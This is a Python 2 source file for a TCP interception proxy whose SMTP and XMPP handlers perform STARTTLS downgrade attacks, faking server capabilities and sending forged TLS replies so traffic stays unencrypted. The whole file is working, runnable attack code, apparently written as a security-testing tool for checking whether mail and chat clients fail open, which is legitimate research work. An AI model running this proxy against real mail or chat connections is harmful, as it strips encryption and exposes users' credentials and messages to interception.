#! /usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : tintinweb@oststrom.com <github.com/tintinweb>
'''
                  inbound                    outbound
[inbound_peer]<------------>[listen:proxy]<------------->[outbound_peer/target]
'''
import socket
import select
import time
import sys
import logging

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
logger = logging.getLogger(__name__)

class SessionTerminatedException(Exception):pass

class TcpSockBuff(object):
    def __init__(self, sock, peer=None):
        self.socket = None
        self.recvbuf = None
        self.sndbuf = None
        self.peer = peer
        self._init(sock)
        
    def _init(self, sock):
        self.socket = sock
        
    def connect(self, target):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return self.socket.connect(target)
    
    def accept(self):
        return self.socket.accept()
                
    def recv(self, buf=8*1024):
        self.recvbuf = self.socket.recv(buf)
        return self.recvbuf
    
    def send(self, data):
        self.sndbuf = self.socket.send(data)
        
    def sendall(self, data):
        self.sndbuf = self.socket.sendall(data)
        
class Session(object):
    def __init__(self, proxy, inbound=None, outbound=None, target=None, buffer_size=4096):
        self.proxy = proxy
        self.bind = proxy.getsockname()
        self.inbound = TcpSockBuff(inbound)
        self.outbound = TcpSockBuff(outbound, peer=target)
        self.buffer_size = buffer_size
    
    def __repr__(self):
        return "<Session %s [client: %s] --> [prxy: %s] --> [target: %s]>"%(hex(id(self)),
                                                                            self.inbound.peer,
                                                                            self.bind,
                                                                            self.outbound.peer)
    def __str__(self):
        return "<Session %s>"%hex(id(self))
        
    def connect(self, target):
        self.outbound.peer = target
        logger.info("%s connecting to target %s"%(self, repr(target)))
        return self.outbound.connect(target)
    
    def accept(self):
        sock, addr = self.proxy.accept()
        self.inbound = TcpSockBuff(sock)
        self.inbound.peer = addr
        logger.info("%s client %s has connected"%(self,repr(self.inbound.peer)))
        return sock,
    
    def get_peer_sockets(self):
        return [self.inbound.socket, self.outbound.socket]
    
    def notify_read(self, sock):
        if sock == self.proxy:
            self.accept()
            self.connect(self.outbound.peer)
        elif sock == self.inbound.socket:
            # new client -> prxy - data
            self.on_recv(self.inbound, self.outbound, self)
        elif sock == self.outbound.socket:
            # new sprxy <- target - data
            self.on_recv(self.outbound, self.inbound, self)
        return 
    
    def close(self):
        self.outbound.socket.close()
        self.inbound.socket.close()
        raise SessionTerminatedException()
    
    def on_recv(self, s_in, s_out, session):
        data = s_in.recv(session.buffer_size)
        if not len(data):
            return session.close()
        if s_in == session.inbound:
            data = self.mangle_client_data(data, session)
        elif s_in == session.outbound:
            data = self.mangle_server_data(data, session)
        if data:
            s_out.sendall(data)
        return data
    
    def mangle_client_data(self, data, session): return data
    def mangle_server_data(self, data, session): return data
    
class ProxyServer(object):
    '''Proxy Class'''
    
    def __init__(self, listen, target, buffer_size=4096, delay=0.0001):
        self.input_list = set([])
        self.sessions = {}  # sock:Session()
        self.callbacks = {} # name: [f,..]
        #
        self.listen = listen
        self.target = target
        # Changing the buffer_size and delay, you can improve the speed and bandwidth.
        # But when buffer get to high or delay go too down, you can broke things
        self.buffer_size = buffer_size
        self.delay = delay
        self.inbound = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.inbound.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.inbound.bind(listen)
        self.inbound.listen(200)
        
    def __str__(self):
        return "<Proxy %s listen=%s target=%s>"%(hex(id(self)),self.listen, self.target)

    def get_session_by_client_sock(self, sock):
        return self.sessions.get(sock)

    def set_callback(self, name, f):
        self.callbacks[name] = f

    def main_loop(self):
        self.input_list.add(self.inbound)
        while True:
            time.sleep(self.delay)
            inputready, _, _ =  select.select(self.input_list, [], [])
            
            for sock in inputready:
                session = None
                try:
                    if sock == self.inbound:
                        # on_accept
                        session = Session(sock, target=self.target)
                        for k,v in self.callbacks.iteritems():
                            setattr(session, k, v)
                        session.notify_read(sock)
                        for s in session.get_peer_sockets():
                            self.sessions[s]=session
                        self.input_list.update(session.get_peer_sockets())
                    else:
                        # on_recv
                        try:
                            session = self.get_session_by_client_sock(sock)
                            session.notify_read(sock)
                        except SessionTerminatedException:
                            self.input_list.difference_update(session.get_peer_sockets())
                            logger.warning("%s terminated."%session)
                except Exception, e:
                    logger.warning("main: %s"%repr(e))
                    if session:
                        self.input_list.difference_update(session.get_peer_sockets())
                    else:
                        self.inbound.remove(sock)
                    raise        

class SMTP:
    @staticmethod
    def mangle_server_data(data, session):
        if "250 HELP" in data:
            features = list(data.strip().split("\r\n"))
            features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
            #if "STARTTLS" in data:
            #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
            data = '\r\n'.join(features)+'\r\n' 
        return data
    @staticmethod
    def mangle_client_data(data, session):
        if "STARTTLS" in data:
            session.inbound.sendall("200 STRIPTLS\r\n")
            logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
            data=None
        return data

class XMPP:
    @staticmethod
    def mangle_server_data(data, session):
        if "<starttls" in data:
            start = data.index("<starttls")
            end = data.index("</starttls>",start)+len("</starttls>")
            data = data[:start] + data[end:]        # strip starttls from capabilities
        return data
    @staticmethod
    def mangle_client_data(data, session):
        if "<starttls" in data:
            # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
            #<failure/> or <proceed/>
            session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
            data=None
        return data 

class Rewrite:
    @staticmethod
    def mangle_server_data(data, session):
        data_orig = data
        logging.debug("%s [client] <= [server]          %s"%(session,repr(data)))
        if session.outbound.peer[1]==25:
            data = SMTP.mangle_server_data(data, session)
        if data!=data_orig:
            logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
        return data
    @staticmethod
    def mangle_client_data(data, session):
        data_orig = data
        logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
        if session.outbound.peer[1]==25:    # SMTP
            data = SMTP.mangle_client_data(data, session)
        if data!=data_orig:
            logging.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
        return data



if __name__ == '__main__':
    ret = 0
    if not len(sys.argv)>1:
        print ("<listen_ip> <listen_port> <forward_ip> <forward_port>")
        sys.exit(1)
    
    local_listen = (sys.argv[1], int(sys.argv[2]))
    forward_to = (sys.argv[3],int(sys.argv[4]))
    prx = ProxyServer(listen=local_listen, target=forward_to, buffer_size=4096, delay=0.00001)
    logger.info("%s ready."%prx)
    prx.set_callback("mangle_server_data", Rewrite.mangle_server_data)
    prx.set_callback("mangle_client_data", Rewrite.mangle_client_data)
    try:
        prx.main_loop()
    except KeyboardInterrupt:
        logger.warning( "Ctrl C - Stopping server")
        ret+=1
    sys.exit(ret)